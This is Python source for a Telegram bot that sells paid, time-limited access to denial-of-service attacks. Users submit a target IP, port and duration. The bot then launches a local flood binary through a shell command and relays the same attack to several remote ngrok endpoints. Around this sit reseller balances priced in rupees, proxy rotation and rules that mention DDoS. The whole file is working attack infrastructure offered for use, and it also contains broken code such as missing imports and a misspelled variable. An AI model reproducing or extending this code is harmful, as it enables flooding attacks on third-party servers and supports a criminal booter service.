import telebot
import subprocess
import datetime
import os
import time
import json
import logging
import shutil
import asyncio
from telebot import types
from threading import Timer, Thread
from requests.exceptions import ReadTimeout, ConnectionError
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
REQUEST_INTERVAL = 1

# Load configuration
CONFIG_FILE = 'config.json'

# Owner and Admin user IDs
owner_ids = "1725783398"

admin_ids = ["1725783398"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store admin IDs
ADMIN_FILE = "admins.txt"

# File to store command logs
LOG_FILE = "log.txt"

def update_proxy(): 
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")
    
async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def write_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)


config = load_config()
bot = telebot.TeleBot(config['bot_token'])
COOLDOWN_TIME = 60
USER_COOLDOWN = 120  # Cooldown time for normal users in seconds

admin_balances = config.get('admin_balances', {})
bgmi_cooldown = {}
ongoing_attacks = {}
allowed_user_ids = {}
user_cooldowns = {}
free_user_credits = {}
authorized_users = {}

# User management functions
def read_users():
    try:
        with open(USER_FILE, 'r') as f:
            users = json.load(f)
            return {user: datetime.datetime.fromisoformat(expiry) for user, expiry in users.items()}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def write_users(users):
    with open(USER_FILE, 'w') as f:
        json.dump({user: expiry.isoformat() for user, expiry in users.items()}, f)

allowed_user_ids = read_users()

def check_expired_users():
    current_time = datetime.datetime.now()
    expired_users = [user for user, expiry in allowed_user_ids.items() if expiry < current_time]
    for user in expired_users:
        del allowed_user_ids[user]
    if expired_users:
        write_users(allowed_user_ids)
        
def run_attack_command(target_ip, target_port, duration):
    files = ["soul.txt", "soul1.txt","soul2.txt", "soul3.txt","soul4.txt", "soul5.txt","soul6.txt", "soul7.txt","soul8.txt","soul9.txt","soul10.txt"]
    
    for current_file in files:
        try:
            with open(current_file, "r") as file:
                ngrok_url = file.read().strip()
                
            url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}"
            headers = {"ngrok-skip-browser-warning": "any_value"}
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                logging.info(f"Attack command sent successfully: {url}")
                logging.info(f"Response: {response.json()}")
            else:
                logging.error(f"Failed to send attack command. Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")
        except Exception as e:
            logging.error(f"Failed to execute command with {current_file}: {e}")

# Logging functions
def log_command(user_id, target, port, duration):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"UserID: {user_id}"
        with open(LOG_FILE, 'a') as f:
            f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
    except Exception as e:
        print(f"Logging error: {e}")

def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w') as f:
            f.truncate(0)
        return "Logs cleared successfully ✅"
    return "Logs are already cleared. No data found."

# Bot command handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_message = (
        "Welcome to the attack bot!\n\n" )

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn_attack = types.KeyboardButton('🚀 Attack')
    markup.row(btn_attack)
    btn_info = types.KeyboardButton('ℹ️ My Info')
    markup.row(btn_info)
    
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

# Bot command handlers
import shutil

@bot.message_handler(commands=['approve'])
def add_user(message):
    if str(message.chat.id) in admin_ids:
        args = message.text.split()
        admin_user = bot.get_chat(message.chat.id)
        admin_username = f"{afmin_user.username}" if admin_user.username else f"UserID: {message.chat.id}"
        if len(args) == 3:
            user_id, duration = args[1], int(args[2])
            cost = duration * 100
            if admin_balances[str(message.chat.id)] >= cost:
                expiry_time = datetime.datetime.now() + datetime.timedelta(days=duration)
                allowed_user_ids[user_id] = expiry_time
                write_users(allowed_user_ids)
                admin_balances[str(message.chat.id)] -= cost
                config['admin_balances'] = admin_balances
                write_config(config)
                

                response = f"User ID: {user_id} approve successfully for {duration} days. You can use attack command now."
            else:
                response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
        elif len(args) == 4 and args[2] == 'hours':
            user_id, hours = args[1], int(args[3])
            duration = hours / 24  # Convert hours to days for costing
            cost = int(duration * 100)
            if admin_balances[str(message.chat.id)] >= cost:
                expiry_time = datetime.datetime.now() + datetime.timedelta(hours=hours)
                allowed_user_ids[user_id] = expiry_time
                write_users(allowed_user_ids)
                admin_balances[str(message.chat.id)] -= cost
                config['admin_balances'] = admin_balances
                write_config(config)

                response = f"User ID: {user_id} approve successfully for {hours} hours. You can now use attack command."
            else:
                response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
        else:
            response = "Usage: /approve <userId> <duration_in_days> or /approve <userId> hours <duration_in_hours>"
    else:
        response = "You are not authorised to approve users."
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.chat.id) in admin_ids:
        args = message.text.split()
        admin_user = bot.get_chat(message.chat.id)
        admin_username = f"@{admin_user.username}" if admin_user.username else f"UserID: {message.chat.id}"
        if len(args) > 1:
            user_id = args[1]
            if user_id in allowed_user_ids:
                del allowed_user_ids[user_id]
                write_users(allowed_user_ids)
                response = f"User ID: {user_id} removed Successfully by {admin_username}."
            else:
                response = f"User {user_id} Not found in the list."
        else:
            response = "Please specify a user ID to remove. Usage: /remove <userid>"
    else:
        response = ""
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['addadmin'])

def add_admin(message):

    user_id = str(message.chat.id)

    if user_id == owner_ids:

        command = message.text.split()

        if len(command) == 3:

            admin_to_add = command[1]

            balance = int(command[2])

            admin_ids.append(admin_to_add)

            free_user_credits[admin_to_add] = balance

            response = f"User ID: {admin_to_add} admin approve successfully with balance {balance}. You can now use bot and admin commands."

        else:

            response = "Usage: /addadmin <id> <balance>"

    else:

        response = "You are not authorised to add admins."

    bot.send_message(message.chat.id, response)



@bot.message_handler(commands=['removeadmin'])

def remove_admin(message):

    user_id = str(message.chat.id)

    if user_id == owner_ids:

        command = message.text.split()

        if len(command) == 2:

            admin_to_remove = command[1]

            if admin_to_remove in admin_ids:

                admin_ids.remove(admin_to_remove)

                response = f"User ID: {admin_to_remove} removed successfully from the admin list."

            else:

                response = f"Admin {admin_to_remove} not found in the list ❌."

        else:

            response = "Usage: /removeadmin <id>"

    else:

        response = "You are not authorised to remove admins."

    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    response = clear_logs() if str(message.chat.id) in admin_ids else "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    if str(message.chat.id) in admin_ids:
        if allowed_user_ids:
            response_lines = []
            for user_id, expiry in allowed_user_ids.items():
                try:
                    user = bot.get_chat(int(user_id))
                    username = f"@{user.username}" if user.username else f"User ID: {user_id}"
                    response_lines.append(f"- {username} - Expires: {expiry}")
                except Exception as e:
                    response_lines.append(f"- User ID: {user_id} - Expires: {expiry} (Error fetching username: {e})")
            response = "Authorized Users:\n" + "\n".join(response_lines)
        else:
            response = "No data found."
    else:
        response = "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    if str(message.chat.id) in admin_ids:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, 'rb') as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.send_message(message.chat.id, "No data found.")
    else:
        bot.send_message(message.chat.id, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.send_message(message.chat.id, f"🤖 USER ID: {str(message.chat.id)}")

# Attack functionality
def start_attack(user_id, target, port, duration):
    attack_id = f"{user_id} {target} {port}"
    user = bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else f"UserID: {user_id}"
    log_command(user_id, target, port, duration)
    response = f"*🚀 Attack Initiated! 💥*\n\n🗺️ Target IP: `{target}`\n🔌 Target Port: `{port}`\n⏳ Duration: `{duration}` seconds"
    bot.send_message(user_id, response, parse_mode='markdown')
    response = f"✅ Successfully Executed: attack"
    bot.send_message(user_id, response)
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./DESI {target} {port} {duration}", shell=True)
        time.sleep(5)
      # Set cooldown for normal users after a successful attack
        if user_id not in admin_ids:
            user_cooldowns[user_id] = datetime.datetime.now()
    except Exception as e:
        bot.send_message(user_id, f"Error: Servers Are Busy Unable To Attack\n{e}")

@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def handle_attack_button(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        bot.send_message(message.chat.id, "Please provide the details for the attack in the following format:\n\n<host> <port> <time>")
        bot.register_next_step_handler(message, handle_attack_details)
    else:
        bot.send_message(message.chat.id, "*🚫 Unauthorised Access! 🚫*\n\nOops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an *Admin* or the *Owner* for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!", parse_mode='markdown')

def handle_attack_details(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            target, port, duration = message.text.split()
            duration = int(duration)

            MAX_DURATION = 360
            if user_id not in admin_ids and duration > MAX_DURATION:
                bot.send_message(message.chat.id, f"❗️𝗘𝗿𝗿𝗼𝗿: 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗧𝗶𝗺𝗲 𝗶𝘀 {MAX_DURATION} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀❗️")
                return

            if user_id not in admin_ids:
                if user_id in user_cooldowns:
                    elapsed_time = (datetime.datetime.now() - user_cooldowns[user_id]).total_seconds()
                    if elapsed_time < USER_COOLDOWN:
                        cooldown_remaining = int(USER_COOLDOWN - elapsed_time)
                        bot.send_message(message.chat.id, f"𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗘𝗳𝗳𝗲𝗰𝘁. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 {cooldown_remaining} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀")
                        return
            thread = Thread(target=start_attack, args=(user_id, target, port, duration))
            thread.start()
        except ValueError:
            bot.send_message(message.chat.id, "")
    else:
        bot.send_message(message.chat.id, "🚫 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! 🚫")

@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def handle_my_info_button(message):
    user_id = str(message.chat.id)
    expiry = allowed_user_ids.get(user_id)
    user = bot.get_chat(int(user_id))
    username = f"@{user.username}" if user.username else "No username available"
    role = "*Admin*" if user_id in owner_ids else "*User*"
    balance = admin_balances.get(user_id, "Not Approved")
    response = (f"*👤 User Info 👤*\n\n"
                f"🔖 Role: *{role}*\n"
                f"🆔 User ID: `{user_id}`\n"
                f"👤 Username: {username}\n"
                f"⏳ Approval Expiry: {expiry if expiry else '*Not approve*'}")
    bot.send_message(message.chat.id, response, parse_mode='markdown')

@bot.message_handler(func=lambda message: message.text == '💼 ResellerShip')
def handle_buy_access_button(message):
    response = (f"Contact @LEGENDVIPOP for reseller ship")
    bot.send_message(message.chat.id, response)


@bot.message_handler(func=lambda message: message.text == '☑️ Rules')
def handle_rules_button(message):
    response = (f"𝟏. 𝐃𝐨𝐧’𝐭 𝐒𝐩𝐚𝐦 𝐓𝐨𝐨 𝐌𝐚𝐧𝐲 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 !! 𝐂𝐚𝐮𝐬𝐞 𝐀 𝐁𝐚𝐧 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭.\n\n𝟐. 𝐃𝐨𝐧’𝐭 𝐑𝐮𝐧 𝟐 𝐂𝐨𝐦𝐦𝐚𝐧𝐬 𝐀𝐭 𝐒𝐚𝐦𝐞 𝐓𝐢𝐦𝐞.\n\n𝟑. 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝  𝐎𝐮𝐫 𝐜𝐡𝐚𝐧𝐧𝐞𝐥 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐓𝐡𝐞 𝐃𝐃𝐨𝐒 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐖𝐨𝐫𝐤.\n\n𝟒. 𝐖𝐞 𝐃𝐚𝐢𝐥𝐲 𝐂𝐡𝐞𝐜𝐤𝐬 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐨 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞𝐬𝐞 𝐫𝐮𝐥𝐞𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐁𝐚𝐧!")
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if str(message.chat.id) in admin_ids:
        args = message.text.split(maxsplit=1)
        if len(args) == 2:
            broadcast_message(args[1])
        else:
            bot.send_message(message.chat.id, "Please provide a message to broadcast. Usage: /broadcast <message>")
    else:
        bot.send_message(message.chat.id, "You are not authorised to send broadcast")

def broadcast_message(msg):
    for user_id in allowed_user_ids:
        try:
            bot.send_message(user_id, msg)
        except Exception as e:
            print(f"Error sending message to {user_id}: {e}")

# Main loop
if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
 